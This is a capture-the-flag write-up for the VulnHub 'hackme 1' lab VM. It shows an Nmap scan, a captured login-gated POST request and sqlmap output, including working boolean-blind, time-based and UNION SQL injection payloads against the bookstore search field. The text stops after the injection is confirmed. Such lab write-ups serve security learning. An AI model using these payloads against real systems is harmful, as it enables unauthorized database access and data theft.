# Boot2RootCTF: *OSCP - hackme 1*

*Note: This box was completed long ago and I am going off of the VMware snapshot I saved after completion, some visuals will be missing and explained instead.*

## Objective

We must go from visiting a simple website to having root access over the entire web server.

We'll download the VM from [here](https://www.vulnhub.com/entry/hackme-1,330/) and set it up with VMware Workstation 16.

Once the machine is up, we get to work.

## Step 1 - Reconnaissance

After finding our IP address using ```ifconfig``` and locating the second host on the network, we can run an Nmap scan to probe it for information.

```
$ sudo nmap -sS -Pn -v -T4 192.168.57.138
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-13 13:49 EDT
Initiating ARP Ping Scan at 13:49
Scanning 192.168.57.138 [1 port]
Completed ARP Ping Scan at 13:49, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:49
Completed Parallel DNS resolution of 1 host. at 13:49, 0.02s elapsed
Initiating SYN Stealth Scan at 13:49
Scanning 192.168.57.138 [1000 ports]
Discovered open port 80/tcp on 192.168.57.138
Discovered open port 22/tcp on 192.168.57.138
Completed SYN Stealth Scan at 13:49, 0.05s elapsed (1000 total ports)
Nmap scan report for 192.168.57.138
Host is up (0.000079s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:BD:A9:FF (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.036KB)
```

Looks like a simple website, so I visit it and am redirected to a ```login.php``` page.

The first thing I see is a login page with the option to create an account.

After creating an account and logging in, I'm presented with a pretty horrible looking bookstore and the ability to search for things.

From the looks of it, it's very obvious that there's SQL involved, so I start performing SQLi.

## Step 2 - Exploitation

Using Burp Suite, I capture the following POST request made to the bookstore and save an offline copy of it.

```
POST /welcome.php HTTP/1.1
Host: 192.168.57.138
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://192.168.57.138
Connection: close
Referer: http://192.168.57.138/welcome.php
Cookie: PHPSESSID=f5truacndojsv5e8o3pr106dlp
Upgrade-Insecure-Requests: 1

search=test
```

Now that I have an offline copy of the request, I don't need to worry about constantly being redirected back to the login page to be able to make any queries.

Using SQLmap, I start basic SQL injection to see if I can avoid going the "manual labor" route.

```
$ sudo sqlmap -r hackme --risk=3 --level=5 -p search
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.6#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:52:20 /2022-07-13/
...
```

Immediately, SQLmap recognizes that the database uses MySQL and starts using MySQL-specific injection queries.

```
...
[13:52:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[13:52:21] [INFO] POST parameter 'search' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="12")
[13:52:21] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
[13:52:23] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
...
```

Finally, a couple of SQL injection queries are found and can successfully be used.

```
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 133 HTTP(s) requests:
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: search=-9991' OR 2731=2731-- Evaa

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=test' AND (SELECT 6383 FROM (SELECT(SLEEP(5)))kKcK)-- FLLT

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=test' UNION ALL SELECT NULL,NULL,CONCAT(0x7171707671,0x704352416e51766274657378426e6a586756416a536e447262767363674f764c4656697156716367,0x7170787671)-- -
---
[13:52:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.10 (cosmic)
web application technology: Apache 2.4.34
back-end DBMS: MySQL >= 5.0.12
[13:52:35] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.57.138'

[*] ending @ 13:52:35 /2022-07-13/
```
